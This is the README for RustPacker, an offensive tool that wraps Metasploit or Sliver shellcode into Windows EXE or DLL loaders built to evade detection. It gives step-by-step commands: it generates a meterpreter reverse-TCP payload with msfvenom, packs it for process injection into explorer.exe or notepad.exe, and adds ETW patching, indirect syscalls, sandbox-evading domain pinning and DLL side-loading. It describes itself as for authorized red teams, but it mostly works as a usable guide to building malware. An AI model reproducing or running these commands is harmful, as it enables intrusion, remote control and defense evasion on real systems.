<h1 align="center">
<br>
<img src=img/logo_craiyon.png height="400" border="2px solid #555">
<br>
</h1>

<p align="center">
  <strong>Turn raw shellcode into evasive Windows binaries — in one command, from any OS.</strong><br>
  <em>Designed for authorized penetration testers and red team operators.</em>
</p>

---

## 🔔 New here? Start with this section

### What is RustPacker?

**Shellcode** is a small blob of machine code that a C2 framework (Metasploit, Sliver, Cobalt Strike…) generates as a payload. By itself it's just bytes — it needs a *loader* to run it on a target Windows machine.

**RustPacker is that loader generator.** It takes your shellcode and wraps it in a Rust program.

The result is a `.exe` or `.dll` that you deliver to your target during an authorized engagement.

### ✨ Key Features

- **Multiple Injection Templates** — CRT, APC, Fibers, EarlyCascade, Module Stomping…
- **Encryption** — XOR, AES-256, UUID encoding
- **Syscall Evasion** — indirect syscalls to bypass EDR user-mode hooks
- **EXE & DLL output** — including DLL proxying / side-loading
- **Sandbox Evasion** — domain pinning prevents detonation in analysis sandboxes
- **Cross-Platform Build** — works on Linux, Windows, macOS via Podman or Docker

---

## 🚀 Quick Start (Local Container — Recommended)

**The fastest and easiest way to use RustPacker! No Rust installation required.**

### ✅ Step 1 — Install Podman or Docker

```bash
# Ubuntu / Debian
sudo apt install podman

# Fedora / RHEL
sudo dnf install podman

# macOS
brew install podman
podman machine init
podman machine start

# Windows (PowerShell)
winget install Podman.Podman  # or install Podman Desktop
```

Verify: `podman --version` or `docker --version`

### 🏗️ Step 2 — Build the Container Locally

```bash
git clone https://github.com/Nariod/RustPacker.git
cd RustPacker/

# Build the all-in-one container
podman build -t rustpacker -f Dockerfile.all-in-one .
```

This step is done **once**. The image is then cached locally.

### 🎯 Step 3 — Generate Your First Payload

**Important:** Place all your shellcode files (e.g., `shellcode.raw`, `payload.bin`) in the `shared/` directory of the RustPacker project. This directory is mounted inside the container at `/workdir/shared/`.

```bash
# Generate a test payload (harmless MessageBox) - note it's saved to shared/
msfvenom -p windows/x64/messagebox TEXT="RustPacker!" TITLE="Test" -f raw -o shared/shellcode.bin

# Generate EXE payload
podman run --rm -v $(pwd):/workdir rustpacker \
  --shellcode-path /workdir/shared/shellcode.bin \
  --format exe \
  --execution ntcrt \
  --encryption xor \
  --output /workdir/shared/payload.exe
```

**Your payload is ready!** Find it at: `shared/payload.exe`

> **Note:** The container uses long-form arguments (`--shellcode-path`, `--format`, `--execution`, `--encryption`, `--output`). Template names support both short aliases (e.g., `ntcrt`, `ntapc`) and full names (e.g., `nt-create-remote-thread`, `nt-queue-user-apc`).

### 🐄 Create an Alias for Daily Use

Add this to your `~/.bashrc` or `~/.zshrc`:

```bash
alias rustpacker='podman run --rm -v $(pwd):/workdir rustpacker'
```

> **⚠️ Remember:** Always place your shellcode files in the `shared/` directory. The alias mounts the current directory to `/workdir` in the container.

Now use it directly:

```bash
# Generate EXE payload
rustpacker \
  --shellcode-path /workdir/shared/shellcode.bin \
  --format exe \
  --execution ntcrt \
  --encryption aes \
  --output /workdir/shared/payload.exe

# Generate DLL payload with self-injection
rustpacker \
  --shellcode-path /workdir/shared/shellcode.bin \
  --format dll \
  --execution ntapc \
  --encryption uuid \
  --output /workdir/shared/payload.dll
```

<details>
<summary>🙏 Windows setup instructions</summary>

### Step 1: Install a Container Runtime

**Option A — Podman Desktop (Recommended):**
1. Download and install [Podman Desktop](https://podman-desktop.io/)
2. Launch Podman Desktop and follow the guided setup to initialize a Podman machine
3. Verify: `podman --version`

**Option B — Docker Desktop:**
1. Download and install [Docker Desktop](https://www.docker.com/products/docker-desktop/)
2. Enable WSL 2 backend during installation (recommended)
3. Verify: `docker --version`

### Step 2: Clone & Build

```powershell
git clone https://github.com/Nariod/RustPacker.git
cd RustPacker
podman build -t rustpacker -f Dockerfile.all-in-one .
```

### Step 3: Pack Shellcode

**Important:** Always place your shellcode files in the `shared\` directory of the RustPacker project before running commands.

```powershell
# Place your shellcode in the shared directory
copy C:\path\to\payload.raw shared\\

# PowerShell - Using container mode with long arguments
podman run --rm -v ${PWD}:/workdir:z rustpacker `\
  --shellcode-path /workdir/shared/payload.raw `\
  --format exe `\
  --execution ntcrt `\
  --encryption aes `\
  --target-process notepad.exe `\
  --output /workdir/shared/output.exe

# cmd.exe
podman run --rm -v %cd%:/workdir:z rustpacker ^
  --shellcode-path /workdir/shared/payload.raw ^
  --format exe ^
  --execution ntcrt ^
  --encryption aes ^
  --target-process notepad.exe ^
  --output /workdir/shared/output.exe
```

**PowerShell alias for container mode:**
```powershell
function rustpacker { podman run --rm -v "${PWD}:/workdir:z" rustpacker @args }
```

</details>

<details>
<summary id="macos">🍎 macOS setup instructions</summary>

```bash
brew install podman
podman machine init
podman machine start

git clone https://github.com/Nariod/RustPacker.git
cd RustPacker/
podman build -t rustpacker -f Dockerfile.all-in-one .

alias rustpacker='podman run --rm -v $(pwd):/workdir rustpacker'

# Important: Place your shellcode in the shared/ directory
rustpacker --shellcode-path /workdir/shared/payload.raw --format exe --execution ntcrt --encryption aes --target-process notepad.exe --output /workdir/shared/output.exe
```

</details>

<details>
<summary>🐕 Alternative: Native Mode (Rust toolchain required)</summary>

If you already have Rust installed, you can run RustPacker directly without building the container first. It will **automatically detect** Podman or Docker and use a container only for cross-compilation:

```bash
git clone https://github.com/Nariod/RustPacker.git
cd RustPacker/
cargo build --release

# Linux / macOS
cargo run -- -s shared/your_shellcode.raw -i ntcrt -e aes -f exe -t notepad.exe

# Windows (PowerShell)
cargo run -- -s shared\your_shellcode.raw -i ntcrt -e aes -f exe -t notepad.exe
```

The first run builds the `rustpacker-builder` image once. Subsequent runs reuse the cached image and a shared cargo registry volume for fast builds.

</details>

---

## 🗠️ Choosing a Template

### Process Injection Templates (use with `-t <process>`)

These inject shellcode into a remote process. Default target: `dllhost.exe`.

| Template | API Level | Indirect Syscalls | Dynamic API | Description |
|----------|-----------|:-----------------:|:-----------:|-------------|
| `wincrt` | High (Windows-rs) | ❌ | ❌ | CreateRemoteThread via the official Windows crate |
| `ntcrt` | Low (ntapi) | ❌ | ✅ | NtCreateThreadEx via dynamic NT API resolution |
| `syscrt` | Syscall | ✅ | ❌ | NtCreateThreadEx via indirect syscalls |
| `earlycascade` | Low (winapi) | ❌ | ❌ | EarlyCascade injection via shim engine callback hijacking |

### Self-Execution Templates (no `-t` needed)

These execute shellcode within the current process.

| Template | API Level | Indirect Syscalls | Dynamic API | ETW patching compatible | Description |
|----------|-----------|:-----------------:|:-----------:|:------------------------:|-------------|
| `ntapc` | Low (ntapi) | ❌ | ✅ | ❌ | Queue APC to current thread via dynamic NT API resolution |
| `winfiber` | High (windows-sys) | ❌ | ❌ | ❌ | Fiber-based execution via Windows API |
| `ntfiber` | Low (ntapi + windows-sys) | ❌ | ✅ | ❌ | Fiber-based execution via dynamic NT API resolution |
| `sysfiber` | Syscall (ntapi + windows-sys) | ✅ | ❌ | ✅ | Fiber-based execution via indirect syscalls |
| `ntstomp` | Low (ntapi) | ❌ | ✅ | ❌ | Module stomping: overwrites a legit DLL's .text with shellcode |
| `ntwat` | Low (ntapi) | ❌ | ✅ | ❌ | WebAssembly stager: wraps the encrypted payload in a wasm module (WAT text format, low entropy), reads the data section back out at runtime, then self-executes |
| `ntveh` | Low (ntapi) | ❌ | ✅ | ❌ | Vectored Exception Handler: registers a VEH, raises an exception, and executes shellcode from the handler |

---

## 📖 Command Line Options

The container mode uses long-form arguments. Both short and long forms are supported in native mode.

> **⚠️ Important for container mode:** All files (shellcode, output, proxy DLLs) must be placed in or output to the `shared/` directory. This directory is mounted at `/workdir/shared/` inside the container.

### Container Mode (Recommended)

```
Usage: podman run --rm -v $(pwd):/workdir rustpacker [OPTIONS]

Required:
  --shellcode-path <FILE>     Path to the raw shellcode file (use /workdir/... for container paths)
  -f, --format <FORMAT>       Output binary format: exe, dll
  -i, --execution <TEMPLATE>  Injection template: ntcrt, ntapc, syscrt, wincrt, winfiber, ntfiber, sysfiber, earlycascade, ntstomp, ntwat, ntveh
  -e, --encryption <METHOD>   Encryption method: xor, aes, uuid

Optional:
  -t, --target-process <PROCESS>  Target process to inject into (default: dllhost.exe, CRT templates only)
  --sandbox <DOMAIN>          Domain pinning: only execute on the specified domain name
  -p, --proxy-dll <DLL_PATH>  DLL proxying: path to legitimate DLL to proxy (requires -f dll, self-injection templates only)
  --etw-patch                 Patch ETW functions to disable Event Tracing for Windows (EDR evasion, requires self-injection templates with indirect syscalls)
  -o, --output <PATH>         Custom output path for the resulting binary
  --help                      Print help
  --version                   Print version
```

### Native Mode (Rust toolchain required)

```
Usage: RustPacker -s <FILE> -f <FORMAT> -i <TEMPLATE> -e <ENCRYPTION> [OPTIONS]

Required:
  -s <FILE>         Path to the raw shellcode file
  -f <FORMAT>       Output binary format: exe, dll
  -i <TEMPLATE>     Injection template: ntapc, ntcrt, syscrt, wincrt, winfiber, ntfiber, sysfiber, earlycascade, ntstomp, ntwat, ntveh
  -e <ENCRYPTION>   Encryption method: xor, aes, uuid

Optional:
  -t <PROCESS>      Target process to inject into (default: dllhost.exe, CRT templates only)
  --sandbox <DOMAIN>  Domain pinning: only execute on the specified domain name
  -p <DLL_PATH>     DLL proxying: path to legitimate DLL to proxy (requires -f dll, self-injection templates only)
  --etw-patch       Patch ETW functions to disable Event Tracing for Windows (EDR evasion, requires self-injection templates with indirect syscalls)
  -o <PATH>         Custom output path for the resulting binary
  -h                Print help
  -V                Print version
```

---

## 📋 Usage Examples

### Generate Shellcode

**Important:** Always save your shellcode files in the `shared/` directory of the RustPacker project. This directory is the only one mounted inside the container.

**Metasploit (msfvenom):**
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread -f raw -o shared/payload.raw
```

**Sliver:**
```bash
# In Sliver console
generate --mtls 192.168.1.100:443 --format shellcode --os windows
# Then copy the generated .bin file to the shared/ folder
```

### Packing Examples

> **⚠️ Important:** All shellcode files must be placed in the `shared/` directory before running these commands. The container mounts `shared/` at `/workdir/shared/`.
>
> The examples below use the `rustpacker` alias defined in the Quick Start section. Replace it with the full `podman run --rm -v $(pwd):/workdir rustpacker` command if you haven't set up the alias.

**Basic EXE with AES encryption (remote injection into notepad):**
```bash
rustpacker --shellcode-path /workdir/shared/payload.raw --format exe --execution ntcrt --encryption aes --target-process notepad.exe --output /workdir/shared/payload.exe
```

**DLL with XOR encryption (self-injection via APC):**
```bash
rustpacker --shellcode-path /workdir/shared/payload.raw --format dll --execution ntapc --encryption xor --output /workdir/shared/payload.dll
```

**Using indirect syscalls (remote injection into explorer):**
```bash
rustpacker --shellcode-path /workdir/shared/payload.raw --format exe --execution syscrt --encryption aes --target-process explorer.exe --output /workdir/shared/payload.exe
```

**UUID encoding (shellcode hidden as UUID strings):**
```bash
rustpacker --shellcode-path /workdir/shared/payload.raw --format exe --execution ntcrt --encryption uuid --target-process notepad.exe --output /workdir/shared/payload.exe
```

**With domain pinning (only detonates on MYDOMAIN):**
```bash
rustpacker --shellcode-path /workdir/shared/payload.raw --format exe --execution winfiber --encryption aes --sandbox MYDOMAIN --output /workdir/shared/payload.exe
```

**Custom output path:**
```bash
rustpacker --shellcode-path /workdir/shared/payload.raw --format exe --execution ntcrt --encryption aes --output /workdir/shared/my_binary.exe
```

**With ETW patching (EDR evasion for sysfiber template):**
```bash
rustpacker --shellcode-path /workdir/shared/payload.raw --format exe --execution sysfiber --encryption aes --etw-patch --output /workdir/shared/payload.exe
```

**DLL proxying (side-loading):**

**Important:** Both your shellcode file AND the DLL to proxy must be placed in the `shared/` directory.

```bash
# 1. Copy the DLL you want to proxy into the shared directory (required for container access)
cp /mnt/c/Windows/System32/version.dll shared/   # from WSL
# or: copy C:\Windows\System32\version.dll shared\  # from Windows

# 2. Proxy version.dll — compatible with self-injection templates only (ntapc, ntfiber, sysfiber, winfiber, ntstomp, ntwat, ntveh)
rustpacker --shellcode-path /workdir/shared/payload.raw --format dll --execution ntfiber --encryption aes --proxy-dll /workdir/shared/version.dll --output /workdir/shared/proxy.dll
```

The proxy DLL forwards all exports to the renamed original (`version_orig.dll`) and executes your shellcode on load via `DllMain`. Deploy by placing the proxy DLL alongside the target application with the original DLL renamed (e.g., `version.dll` \u2192 `version_orig.dll`).

> **Note:** The `--proxy-dll` path must be accessible from within the container. Use the `/workdir/` prefix for all paths when running in container mode.

---

## 🔒 Detection Evasion

RustPacker implements several evasion techniques:

- **No RWX Memory**: Memory is allocated as RW, written, then re-protected as RX only — never RWX. This eliminates a major behavioral detection signal used by EDR/AV.
- **Dynamic API Resolution** (`nt*` templates): NT API functions are resolved at runtime via `GetProcAddress` with XOR-obfuscated function names (random key per build). This removes suspicious ntdll imports from the PE import table.
- **Indirect Syscalls**: Bypass user-mode hooks (`syscrt`, `sysfiber` templates)
- **ETW Patching**: Disables Event Tracing for Windows functions (EtwEventWrite, EtwEventRegister, etc.) via indirect syscalls to bypass EDR monitoring (available with `--etw-patch` flag for `sysfiber` template)
- **Payload Encryption**: XOR encoding, AES-256-CBC encryption, or UUID-based encoding
- **String Encryption**: Runtime literals in generated loaders are wrapped with litcrypt to reduce static string exposure
- **Process Injection**: Hide execution in legitimate processes
- **Domain Pinning**: Only detonate on a specific domain (sandbox evasion)
- **Silent Failures**: No descriptive error messages in the binary — all failures exit silently to avoid IoC string detection
- **Template Variety**: Multiple execution methods to avoid static signatures
- **Rust Compilation**: Native binaries with stripped symbols and LTO

> ⚠️ **Breaking Change**: Since RWX (PAGE_EXECUTE_READWRITE) is no longer used, **self-modifying / dynamic shellcode is not supported**. Only static shellcode payloads are compatible. Most C2 frameworks (Metasploit, Sliver, Cobalt Strike, Havoc) generate static shellcode by default — this should not affect typical usage.

---

## ⚙️ Local Installation (Without Containers)

If you prefer to compile without containers (Linux only):

### Prerequisites

```bash
# Ubuntu/Debian
sudo apt update && sudo apt upgrade -y
sudo apt install -y libssl-dev librust-openssl-dev musl-tools mingw-w64 cmake libxml2-dev

# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env
rustup target add x86_64-pc-windows-gnu
```

### Build and Run

```bash
git clone https://github.com/Nariod/RustPacker.git
cd RustPacker/
cargo run -- -s shared/payload.raw -i ntcrt -e xor -f exe -t explorer.exe
```

> When no container runtime is detected, RustPacker falls back to local compilation automatically.

---

## 🐳 Why Podman over Docker?

We recommend using Podman instead of Docker for [security reasons](https://cloudnweb.dev/2019/10/heres-why-podman-is-more-secured-than-docker-devsecops/):
- Rootless containers by default
- No daemon running as root
- Better security isolation

---

## 🐝 Contributing

Contributions are welcome! Here's how you can help:

1. **Code Review**: Review the codebase for improvements
2. **Issues**: Report bugs or request features
3. **Templates**: Contribute new injection techniques
4. **Documentation**: Improve documentation and examples

---

## 🙏 Acknowledgments

- [0xNinjaCyclone](https://github.com/0xNinjaCyclone) & [Karkas](https://github.com/Karkas66) - [EarlyCascade injection technique](https://github.com/Karkas66/EarlyCascadeImprooved)
- [0xWerz](https://github.com/0xWerz) - String encryption implementation
- [memN0ps](https://github.com/memN0ps) - Inspiration and guidance
- [rust-syscalls](https://github.com/janoglezcampos/rust_syscalls) - Syscall implementation
- [trickster0](https://github.com/trickster0) - OffensiveRust repository
- [Maldev Academy](https://maldevacademy.com/) - Fiber execution techniques
- [craiyon](https://www.craiyon.com/) - Logo generation

---

## 📄 License & Legal Notice

**⚠️ IMPORTANT DISCLAIMER ⚠️**

This tool is provided for **educational and authorized penetration testing purposes only**.

- Usage against targets without prior mutual consent is **illegal**
- Users are responsible for complying with all applicable laws
- Developers assume no liability for misuse or damages
- Only use in authorized environments with proper permission

**Use responsibly and ethically.**

---

<div align="center">

**Made with ❤️ for the cybersecurity community**

[Report Issues](https://github.com/Nariod/RustPacker/issues) • [Contribute](https://github.com/Nariod/RustPacker/pulls) • [Documentation](https://github.com/Nariod/RustPacker/wiki)

</div>
